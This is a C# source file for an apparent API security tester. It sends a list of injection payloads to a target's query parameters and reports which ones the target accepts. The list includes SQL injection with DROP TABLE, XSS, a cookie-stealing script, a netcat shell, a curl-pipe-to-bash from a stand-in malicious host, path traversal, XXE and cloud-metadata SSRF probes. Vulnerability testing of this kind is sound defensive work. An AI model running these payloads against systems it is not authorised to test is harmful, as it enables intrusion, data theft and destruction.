namespace API_Tester;

public partial class MainPage
{
    /*
    Input and Injection Testing Payloads

    Purpose:
    Provides predefined payloads designed to test the application for
    input validation and injection vulnerabilities, including SQL, 
    XSS (Cross-Site Scripting), path traversal, and NoSQL injection attacks.

    Threat Model:
    Applications that do not properly validate or sanitize user input
    may be vulnerable to attacks that allow attackers to:

        - Retrieve, modify, or delete sensitive data
        - Execute arbitrary scripts in clients' browsers
        - Access restricted files or system resources
        - Circumvent authentication and authorization controls

    Typical injection vectors include:

        - Form fields, query parameters, or URL paths
        - JSON or XML payloads
        - File or directory inputs
        - Scriptable HTML or JavaScript inputs

    Test Strategy:
    The method returns an array of strings representing common attack
    payloads. These payloads simulate malicious input to verify whether 
    the system properly:

        - Escapes or sanitizes inputs
        - Uses parameterized queries for databases
        - Validates paths to prevent traversal attacks
        - Encodes or filters output to prevent XSS

    Potential Impact:
    If input injection vulnerabilities exist, attackers may be able to:

        - Compromise application integrity or availability
        - Execute client-side scripts in other users' browsers
        - Access sensitive system files or configuration
        - Manipulate or bypass application logic

    Expected Behavior:
    Applications should:

        - Validate and sanitize all inputs
        - Use parameterized queries or prepared statements
        - Restrict access to sensitive files or directories
        - Encode output and prevent script execution in clients
    */
    
    private static string[] GetInputAndInjectionTestingPayloads() =>
    [
        "' OR 1=1 --",
        "' OR 'a'='a' --",
        "admin' --",
        "' UNION SELECT null, username, password FROM users --",
        "'; EXEC xp_cmdshell('dir') --",
        "admin' AND 1=2 UNION SELECT null, username, password FROM users --",
        "'; DROP TABLE users; --",
        "' AND 1=0 UNION SELECT 1, username, password FROM users --",
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg/onload=alert(1)>",
        "<a href='javascript:alert(1)'>Click Me</a>",
        "<iframe src='javascript:alert(1)'></iframe>",
        "<body onload=alert('XSS')>",
        "<input type='text' value=''><script>alert(document.cookie)</script>",
        "<script>confirm('XSS')</script>",
        "'; ls -la; --",
        "'; dir; --",
        "'; cat /etc/passwd; --",
        "'; ping 127.0.0.1; --",
        "'; netstat -an; --",
        "'; nc -l -p 8080 -e /bin/bash; --",
        "'; curl http://malicious-site.com/malware.sh | bash; --",
        "../../../etc/passwd",
        "..\\..\\..\\Windows\\System32\\cmd.exe",
        "../../../../etc/hosts",
        "..\\..\\..\\Program Files\\",
        "..\\..\\..\\..\\..\\boot.ini",
        "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]> <foo>&xxe;</foo>",
        "<!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file:///C:/Windows/System32/drivers/etc/hosts\"> ]> <foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"ISO-8859-1\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://malicious.com/malicious.dtd\"> ]> <foo>&xxe;</foo>",
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?> <!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://malicious.com/malicious.dtd\"> ]> <foo>&xxe;</foo>",
        "http://localhost",
        "http://127.0.0.1",
        "http://0.0.0.0",
        "http://169.254.169.254",
        "http://localhost:8080/admin",
        "http://10.0.0.1",
        "http://www.example.com/file://etc/passwd",
        "'; SELECT * FROM information_schema.tables --",
        "<script>alert(document.cookie);</script>",
        "<script>document.location='http://malicious-site.com?cookie=' + document.cookie;</script>",
        "GET / HTTP/1.1\r\nHost: victim.com\r\nX-Forwarded-For: 127.0.0.1\r\n\r\n",
        "user%0D%0A%20Authorization:Bearer%20malicious-token",
        "POST / HTTP/1.1\r\nHost: victim.com\r\nX-Forwarded-For: malicious-ip\r\n\r\n"
    ];

    private HttpRequestMessage FormatInputAndInjectionTestingRequest(Uri baseUri, string payload)
    {
        var probeUri = AppendQuery(baseUri, new Dictionary<string, string>
        {
            ["q"] = payload,
            ["search"] = payload
        });
        return new HttpRequestMessage(HttpMethod.Get, probeUri);
    }

    private async Task<string> RunInputAndInjectionTestingTestsAsync(Uri baseUri)
    {
        var payloads = GetInputAndInjectionTestingPayloads();
        var findings = new List<string>();
        var accepted = 0;

        foreach (var payload in payloads)
        {
            var response = await SafeSendAsync(() => FormatInputAndInjectionTestingRequest(baseUri, payload));
            findings.Add($"Payload '{payload}': {FormatStatus(response)}");
            if (response is not null && (int)response.StatusCode is >= 200 and < 300)
            {
                accepted++;
            }
        }

        findings.Insert(0, $"Payload variants tested: {payloads.Length}");
        findings.Add(accepted > 1
            ? $"Potential risk: weak injection controls observed on {accepted}/{payloads.Length} probes."
            : "No obvious injection-control weakness across tested payloads.");

        return FormatSection("CREST Input And Injection Testing", baseUri, findings);
    }
}
